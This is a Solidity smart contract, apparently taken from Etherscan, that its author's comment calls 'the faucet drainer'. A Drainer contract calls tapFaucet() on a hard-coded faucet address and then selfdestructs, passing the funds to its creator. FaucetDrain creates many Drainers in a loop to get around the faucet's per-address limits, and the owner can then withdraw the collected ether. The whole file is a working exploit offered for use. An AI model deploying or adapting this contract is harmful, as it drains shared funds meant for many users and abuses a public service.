/**
 *Submitted for verification at Etherscan.io on 2022-09-14
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

/*
 With greetings from the faucet drainer :P
*/


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}


interface IFaucet {
    function tapFaucet() external;
}

contract Drainer {
    constructor() {
        IFaucet(address(0x04e77c3a4D46BA60fcd2cb48a2FDA6d117E65e69)).tapFaucet();
        selfdestruct(payable(msg.sender));
    }
}

contract FaucetDrain is Ownable {
  
  function drain(uint256 count) public onlyOwner {
    for(uint i = 0; i < count; i++) {
      new Drainer();
    }
  }

  function sendEther(address addr, uint256 amount) public onlyOwner {
    uint balance = address(this).balance;
    require(balance > 0, "wallet is empty");
    require(balance >= amount, "not enough funds in wallet");

    (bool sent, ) = payable(addr).call{value: amount}("");
    require(sent, "failed to send ether");
  }

  receive() external payable {
  }
}